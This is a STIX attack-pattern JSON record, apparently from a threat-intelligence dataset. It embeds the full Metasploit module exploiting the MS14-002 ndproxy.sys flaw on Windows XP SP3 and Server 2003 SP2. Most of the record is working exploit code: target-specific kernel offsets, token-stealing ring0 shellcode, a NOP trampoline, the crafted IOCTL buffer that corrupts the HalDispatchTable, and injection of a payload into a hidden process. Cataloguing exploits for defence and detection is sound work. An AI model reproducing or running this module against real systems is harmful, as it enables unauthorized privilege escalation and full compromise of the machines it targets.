{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b1f00a2c-b9b7-4a96-a13a-c90781a6e99b",
    "created": "2024-08-14T16:49:13.513954Z",
    "modified": "2024-08-14T16:49:13.513958Z",
    "name": "MS14-002 Microsoft Windows ndproxy.sys Local Privilege Escalation",
    "description": " This module exploits a flaw in the ndproxy.sys driver on Windows XP SP3 and Windows 2003 SP2 systems, exploited in the wild in November, 2013. The vulnerability exists while processing an IO Control Code 0x8fff23c8 or 0x8fff23cc, where user provided input is used to access an array unsafely, and the value is used to perform a call, leading to a NULL pointer dereference which is exploitable on both Windows XP and Windows 2003 systems. This module has been tested successfully on Windows XP SP3 and Windows 2003 SP2. In order to work the service \"Routing and Remote Access\" must be running on the target system.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/ms_ndproxy.rb",
            "external_id": "ms_ndproxy.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = AverageRanking\n\n  include Msf::Exploit::Local::WindowsKernel\n  include Msf::Post::File\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Process\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        {\n          'Name' => 'MS14-002 Microsoft Windows ndproxy.sys Local Privilege Escalation',\n          'Description' => %q{\n            This module exploits a flaw in the ndproxy.sys driver on Windows XP SP3 and Windows 2003\n            SP2 systems, exploited in the wild in November, 2013. The vulnerability exists while\n            processing an IO Control Code 0x8fff23c8 or 0x8fff23cc, where user provided input is used\n            to access an array unsafely, and the value is used to perform a call, leading to a NULL\n            pointer dereference which is exploitable on both Windows XP and Windows 2003 systems. This\n            module has been tested successfully on Windows XP SP3 and Windows 2003 SP2. In order to\n            work the service \"Routing and Remote Access\" must be running on the target system.\n          },\n          'License' => MSF_LICENSE,\n          'Author' => [\n            'Unknown', # Vulnerability discovery\n            'ryujin', # python PoC\n            'Shahin Ramezany', # C PoC\n            'juan vazquez' # MSF module\n          ],\n          'Arch' => ARCH_X86,\n          'Platform' => 'win',\n          'Payload' => {\n            'Space' => 4096,\n            'DisableNops' => true\n          },\n          'SessionTypes' => ['meterpreter'],\n          'DefaultOptions' => {\n            'EXITFUNC' => 'thread'\n          },\n          'Targets' => [\n            ['Automatic', {}],\n            [\n              'Windows XP SP3',\n              {\n                'HaliQuerySystemInfo' => 0x16bba, # Stable over Windows XP SP3 updates\n                '_KPROCESS' => \"\\x44\", # Offset to _KPROCESS from a _ETHREAD struct\n                '_TOKEN' => \"\\xc8\",    # Offset to TOKEN from the _EPROCESS struct\n                '_UPID' => \"\\x84\",     # Offset to UniqueProcessId FROM the _EPROCESS struct\n                '_APLINKS' => \"\\x88\"   # Offset to ActiveProcessLinks _EPROCESS struct\n              }\n            ],\n            [\n              'Windows Server 2003 SP2',\n              {\n                'HaliQuerySystemInfo' => 0x1fa1e,\n                '_KPROCESS' => \"\\x38\",\n                '_TOKEN' => \"\\xd8\",\n                '_UPID' => \"\\x94\",\n                '_APLINKS' => \"\\x98\"\n              }\n            ]\n          ],\n          'References' => [\n            %w[CVE 2013-5065],\n            %w[MSB MS14-002],\n            %w[OSVDB 100368],\n            %w[BID 63971],\n            %w[EDB 30014],\n            %w[URL http://labs.portcullis.co.uk/blog/cve-2013-5065-ndproxy-array-indexing-error-unpatched-vulnerability/],\n            %w[URL http://technet.microsoft.com/en-us/security/advisory/2914486],\n            %w[URL http://www.secniu.com/blog/?p=53],\n            %w[URL http://www.fireeye.com/blog/technical/cyber-exploits/2013/11/ms-windows-local-privilege-escalation-zero-day-in-the-wild.html],\n            %w[URL http://blog.spiderlabs.com/2013/12/the-kernel-is-calling-a-zeroday-pointer-cve-2013-5065-ring-ring.html]\n          ],\n          'DisclosureDate' => '2013-11-27',\n          'DefaultTarget' => 0,\n          'Compat' => {\n            'Meterpreter' => {\n              'Commands' => %w[\n                stdapi_railgun_api\n                stdapi_sys_config_getenv\n                stdapi_sys_process_attach\n                stdapi_sys_process_execute\n                stdapi_sys_process_memory_write\n              ]\n            }\n          }\n        }\n      )\n    )\n  end\n\n  def ring0_shellcode(t)\n    restore_ptrs = \"\\x31\\xc0\" # xor eax, eax\n    restore_ptrs << \"\\xb8\" + [@addresses['HaliQuerySystemInfo']].pack('V')  # mov eax, offset hal!HaliQuerySystemInformation\n    restore_ptrs << \"\\xa3\" + [@addresses['halDispatchTable'] + 4].pack('V') # mov dword ptr [nt!HalDispatchTable+0x4], eax\n\n    ring0_shellcode = restore_ptrs + token_stealing_shellcode(t)\n    ring0_shellcode\n  end\n\n  def fill_memory(proc, address, length, content)\n    session.railgun.ntdll.NtAllocateVirtualMemory(-1, [address].pack('V'), nil, [length].pack('V'), 'MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN', 'PAGE_EXECUTE_READWRITE')\n    unless proc.memory.writable?(address)\n      vprint_error('Failed to allocate memory')\n      return nil\n    end\n\n    vprint_good(\"#{address} is now writable\")\n\n    result = proc.memory.write(address, content)\n\n    if result.nil?\n      vprint_error('Failed to write contents to memory')\n      return nil\n    else\n      vprint_good(\"Contents successfully written to 0x#{address.to_s(16)}\")\n    end\n\n    address\n  end\n\n  def create_proc\n    windir = session.sys.config.getenv('windir')\n    cmd = \"#{windir}\\\\System32\\\\notepad.exe\"\n    # run hidden\n    begin\n      proc = session.sys.process.execute(cmd, nil, 'Hidden' => true)\n    rescue Rex::Post::Meterpreter::RequestError\n      # when running from the Adobe Reader sandbox:\n      # Exploit failed: Rex::Post::Meterpreter::RequestError stdapi_sys_process_execute: Operation failed: Access is denied.\n      return nil\n    end\n\n    proc.pid\n  end\n\n  def disclose_addresses(t)\n    addresses = {}\n\n    hal_dispatch_table = find_haldispatchtable\n    return nil if hal_dispatch_table.nil?\n\n    addresses['halDispatchTable'] = hal_dispatch_table\n    vprint_good(\"HalDispatchTable found at 0x#{addresses['halDispatchTable'].to_s(16)}\")\n\n    vprint_status('Getting the hal.dll base address...')\n    hal_info = find_sys_base('hal.dll')\n    if hal_info.nil?\n      vprint_error('Failed to disclose hal.dll base address')\n      return nil\n    end\n    hal_base = hal_info[0]\n    vprint_good(\"hal.dll base address disclosed at 0x#{hal_base.to_s(16)}\")\n\n    hali_query_system_information = hal_base + t['HaliQuerySystemInfo']\n    addresses['HaliQuerySystemInfo'] = hali_query_system_information\n\n    vprint_good(\"HaliQuerySystemInfo address disclosed at 0x#{addresses['HaliQuerySystemInfo'].to_s(16)}\")\n    addresses\n  end\n\n  def check\n    if sysinfo['Architecture'] == ARCH_X64\n      vprint_error 'Running against 64-bit systems is not supported'\n      return CheckCode::Safe\n    end\n\n    handle = open_device('\\\\\\\\.\\\\NDProxy', 0x0, 0x0, 0x3)\n    return Exploit::CheckCode::Safe if handle.nil?\n\n    session.railgun.kernel32.CloseHandle(handle)\n\n    version = get_version_info\n    if version.build_number == Msf::WindowsVersion::XP_SP3 ||\n       version.build_number == Msf::WindowsVersion::Server2003_SP2\n      return Exploit::CheckCode::Appears\n    elsif version.xp_or_2003?\n      return Exploit::CheckCode::Detected\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def exploit\n    if sysinfo['Architecture'] == ARCH_X64\n      fail_with(Failure::NoTarget, 'Running against 64-bit systems is not supported')\n    end\n\n    my_target = nil\n    if target.name =~ /Automatic/\n      print_status('Detecting the target system...')\n      version = get_version_info\n      if version.build_number == Msf::WindowsVersion::XP_SP3 ||\n         (my_target = targets[1])\n        print_status(\"Running against #{my_target.name}\")\n      elsif version.build_number == Msf::WindowsVersion::Server2003_SP2\n        my_target = targets[2]\n        print_status(\"Running against #{my_target.name}\")\n      end\n    else\n      my_target = target\n    end\n\n    if my_target.nil?\n      fail_with(Failure::NoTarget, 'Remote system not detected as target, select the target manually')\n    end\n\n    print_status('Checking device...')\n    handle = open_device('\\\\\\\\.\\\\NDProxy', 0x0, 0x0, 0x3)\n    if handle.nil?\n      fail_with(Failure::NoTarget, '\\\\\\\\.\\\\NDProxy device not found')\n    else\n      print_good('\\\\\\\\.\\\\NDProxy found!')\n    end\n\n    print_status('Disclosing the HalDispatchTable and hal!HaliQuerySystemInfo addresses...')\n    @addresses = disclose_addresses(my_target)\n    if @addresses.nil?\n      session.railgun.kernel32.CloseHandle(handle)\n      fail_with(Failure::Unknown, 'Failed to disclose necessary addresses for exploitation, aborting.')\n    else\n      print_good('Addresses successfully disclosed.')\n    end\n\n    print_status('Storing the kernel stager in memory...')\n    this_proc = session.sys.process.open\n    kernel_shell = ring0_shellcode(my_target)\n    kernel_shell_address = 0x1000\n    result = fill_memory(this_proc, kernel_shell_address, kernel_shell.length, kernel_shell)\n    if result.nil?\n      session.railgun.kernel32.CloseHandle(handle)\n      fail_with(Failure::Unknown, 'Error while storing the kernel stager shellcode on memory')\n    else\n      print_good(\"Kernel stager successfully stored at 0x#{kernel_shell_address.to_s(16)}\")\n    end\n\n    print_status('Storing the trampoline to the kernel stager on memory...')\n    trampoline = \"\\x90\" * 0x38       # nops\n    trampoline << \"\\x68\"             # push opcode\n    trampoline << [0x1000].pack('V') # address to push\n    trampoline << \"\\xc3\"             # ret\n    trampoline_addr = 0x1\n    result = fill_memory(this_proc, trampoline_addr, trampoline.length, trampoline)\n    if result.nil?\n      session.railgun.kernel32.CloseHandle(handle)\n      fail_with(Failure::Unknown, 'Error while storing trampoline on memory')\n    else\n      print_good(\"Trampoline successfully stored at 0x#{trampoline_addr.to_s(16)}\")\n    end\n\n    print_status('Storing the IO Control buffer on memory...')\n    buffer = \"\\x00\" * 1024\n    buffer[20, 4] = [0x7030125].pack('V') # In order to trigger the vulnerable call\n    buffer[28, 4] = [0x34].pack('V')      # In order to trigger the vulnerable call\n    buffer_addr = 0x0d0d0000\n    result = fill_memory(this_proc, buffer_addr, buffer.length, buffer)\n    if result.nil?\n      session.railgun.kernel32.CloseHandle(handle)\n      fail_with(Failure::Unknown, 'Error while storing the IO Control buffer on memory')\n    else\n      print_good(\"IO Control buffer successfully stored at 0x#{buffer_addr.to_s(16)}\")\n    end\n\n    print_status('Triggering the vulnerability, corrupting the HalDispatchTable...')\n    magic_ioctl = 0x8fff23c8\n    # Values taken from the exploit in the wild, see references\n    session.railgun.ntdll.NtDeviceIoControlFile(handle, 0, 0, 0, 4, magic_ioctl, buffer_addr, buffer.length, buffer_addr, 0x80)\n\n    session.railgun.kernel32.CloseHandle(handle)\n\n    print_status('Executing the Kernel Stager throw NtQueryIntervalProfile()...')\n    session.railgun.ntdll.NtQueryIntervalProfile(1337, 4)\n\n    print_status('Checking privileges after exploitation...')\n\n    unless is_system?\n      fail_with(Failure::Unknown, 'The exploitation was not successful')\n    end\n\n    p = payload.encoded\n    print_good('Exploitation successful! Creating a new process and launching payload...')\n    new_pid = create_proc\n\n    if new_pid.nil?\n      print_warning('Unable to create a new process, maybe you are in a sandbox. If the current process has been elevated try to migrate before executing a new process...')\n      return\n    end\n\n    print_status(\"Injecting #{p.length} bytes into #{new_pid} memory and executing it...\")\n    if execute_shellcode(p, nil, new_pid)\n      print_good('Enjoy')\n    else\n      fail_with(Failure::Unknown, 'Error while executing the payload')\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-11-27",
    "x_mitre_platforms": [
        "win'"
    ]
}